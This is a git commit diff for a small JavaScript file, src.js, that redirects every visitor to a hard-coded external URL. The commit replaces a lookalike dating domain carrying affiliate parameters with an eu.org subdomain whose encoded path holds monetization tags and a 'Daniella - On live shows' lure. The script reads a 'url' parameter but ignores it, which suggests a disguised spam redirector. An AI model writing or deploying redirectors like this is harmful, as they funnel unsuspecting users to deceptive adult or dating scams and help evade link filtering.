1e3a6245ce5de24ac839fb68d1d179ea094dbb6c
enjoy06 <152522310+enjoy06@users.noreply.github.com>
2025-03-03 19:02:51 +0700

    Update src.js

--- src.js
+++ src.js
@@ -1,3 +1,3 @@
 const looking = new URLSearchParams(window.location.search);
 const directed = looking.get('url');
-window.location.href = 'https://wellvr.beamlngdate.net/?utm_source=da57dc555e50572d&s1=99207&s2=1311562&click_id=SOLUSIE&j1=1';
+window.location.href = 'http://rosahaley.frx-team.eu.org/WnBOQUssU09MVVNJRSwxNzQxMDAzMzUzLCxJTU9ORVRJWkVJVCxIaSEgSSdtOiBEYW5pZWxsYSAtIE9uIGxpdmUgc2hvd3MhLA';
